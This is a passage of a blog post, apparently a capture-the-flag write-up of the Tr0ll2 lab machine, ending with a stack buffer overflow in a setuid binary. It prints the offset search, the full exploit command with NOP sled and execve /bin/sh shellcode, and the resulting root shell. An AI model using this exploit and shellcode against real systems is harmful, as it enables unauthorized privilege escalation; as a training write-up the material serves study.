+</span><span class='line'><span class="n">command</span><span class="o">=</span><span class="s">&quot;echo TRY HARDER LOL!&quot;</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G</span><span class="o">/</span><span class="n">kLMyjm</span><span class="o">/</span><span class="n">rrcQymKVqy4EgUyJ</span><span class="o">+</span><span class="mi">3</span><span class="n">Oyv7D5QV73IWECguqrINI</span><span class="o">+</span><span class="n">OuY</span><span class="o">+</span><span class="n">zIV49ykebBYR15HkBYi</span><span class="o">/</span><span class="mi">9</span><span class="n">GYZmHRD5CHq9I</span><span class="o">+</span><span class="n">zCLHv</span><span class="o">/</span><span class="mi">9</span><span class="n">Kdf9Ae</span><span class="o">+</span><span class="n">HQIaF</span><span class="o">/</span><span class="n">X</span><span class="o">/</span><span class="mi">3</span><span class="n">PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9</span><span class="o">/</span><span class="n">LXVOHfcrCZyyCc</span><span class="o">+</span><span class="n">ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9</span><span class="o">+</span><span class="n">ohdZBgGVncc1ngtW0b7mKf1u</span><span class="o">+</span><span class="n">RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69</span> <span class="n">noob</span><span class="nd">@Tr0ll2</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ls</span> <span class="o">/</span>
+</span><span class='line'><span class="nb">bin</span>   <span class="n">dev</span>  <span class="n">home</span>        <span class="n">lib</span>      <span class="n">media</span>  <span class="n">nothing_to_see_here</span>  <span class="n">proc</span>  <span class="n">run</span>   <span class="n">selinux</span>  <span class="n">sys</span>  <span class="n">usr</span>  <span class="n">vmlinuz</span>
+</span><span class='line'><span class="n">boot</span>  <span class="n">etc</span>  <span class="n">initrd</span><span class="o">.</span><span class="n">img</span>  <span class="n">lost</span><span class="o">+</span><span class="n">found</span>  <span class="n">mnt</span>   <span class="n">opt</span>               <span class="n">root</span>  <span class="n">sbin</span>  <span class="n">srv</span>     <span class="n">tmp</span>  <span class="n">var</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="nb">file</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
+</span><span class='line'><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">directory</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">4</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">choose_wisely</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">*</span>
+</span><span class='line'><span class="n">door1</span><span class="p">:</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">.</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
+</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7271</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">r00t</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">door2</span><span class="p">:</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">20</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
+</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">8401</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">door3</span><span class="p">:</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
+</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
+</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7273</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="nb">file</span> <span class="n">r00t</span>
+</span><span class='line'><span class="n">r00t</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">Intel</span> <span class="mi">80386</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span> <span class="p">(</span><span class="n">uses</span> <span class="n">shared</span> <span class="n">libs</span><span class="p">),</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">24</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mh">0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
+</span><span class='line'><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">r00t</span> <span class="nb">input</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span> <span class="n">lol</span>
+</span><span class='line'><span class="n">lol</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
+</span><span class='line'><span class="n">Good</span> <span class="n">job</span><span class="p">,</span> <span class="n">stand</span> <span class="n">by</span><span class="p">,</span> <span class="n">executing</span> <span class="n">root</span> <span class="n">shell</span><span class="o">...</span>
+</span><span class='line'><span class="n">BUHAHAHA</span> <span class="n">NOOB</span><span class="err">!</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span>
+</span><span class='line'><span class="n">Broadcast</span> <span class="n">message</span> <span class="kn">from</span> <span class="nn">noob</span><span class="nd">@Tr0ll2</span>
+</span><span class='line'>  <span class="p">(</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">57</span> <span class="o">...</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">The</span> <span class="n">system</span> <span class="ow">is</span> <span class="n">going</span> <span class="n">down</span> <span class="k">for</span> <span class="n">reboot</span> <span class="n">NOW</span><span class="err">!</span>
+</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span><span class="o">.</span>
+</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
+</span><span class='line'>
+</span><span class='line'>2 MINUTE HARD MODE LOL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x6a413969 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see where exactly in the pattern it happens:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
+</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Taking a closer look at the registers and stack:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
+</span><span class='line'>
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x42424242 in ?? ()
+</span><span class='line'>(gdb) info r
+</span><span class='line'>eax            0x120  288
+</span><span class='line'>ecx            0x0    0
+</span><span class='line'>edx            0x0    0
+</span><span class='line'>ebx            0xb7fd1ff4 -1208147980
+</span><span class='line'>esp            0xbffffb50 0xbffffb50
+</span><span class='line'>ebp            0x41414141 0x41414141
+</span><span class='line'>esi            0x0    0
+</span><span class='line'>edi            0x0    0
+</span><span class='line'>eip            0x42424242 0x42424242
+</span><span class='line'>eflags         0x210286   [ PF SF IF RF ID ]
+</span><span class='line'>cs             0x73   115
+</span><span class='line'>ss             0x7b   123
+</span><span class='line'>ds             0x7b   123
+</span><span class='line'>es             0x7b   123
+</span><span class='line'>fs             0x0    0
+</span><span class='line'>gs             0x33   51
+</span><span class='line'>(gdb) x $esp
+</span><span class='line'>0xbffffb50:   0x43434343</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>
+
+<p>What we have now for a functional exploit:</p>
+
+<ul>
+<li><p>268 bytes to fill the buffer</p></li>
+<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
+<li><p>NOP sled for padding</p></li>
+<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
+</ul>
+
+
+<p>Ran the exploit in GDB:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
+</span><span class='line'>process 1838 is executing new program: /bin/dash
+</span><span class='line'>$ id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x90\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
+</span><span class='line'># id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
+</span><span class='line'># ls /root/   
+</span><span class='line'>Proof.txt  core1  core2  core3    core4  goal  hardmode  lmao.zip  ran_dir.py  reboot
+</span><span class='line'># cat /root/Proof.txt
+</span><span class='line'>You win this time young Jedi...
+</span><span class='line'>
+</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/ A visit to a fresh place will bring \
+</span><span class='line'>\ strange work.                       /
+</span><span class='line'> -------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-06-06T08:58:25-04:00" pubdate data-updated="true">Jun 6<span>th</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/05/29/dnsenum-kali-linux-tools/" title="Previous Post: dnsenum - Kali Linux tools">&laquo; dnsenum - Kali Linux tools</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2017/06/07/lbd-kali-linux-tools/" title="Next Post: lbd - Kali Linux tools">lbd - Kali Linux tools &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/';
+        var disqus_url = 'http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
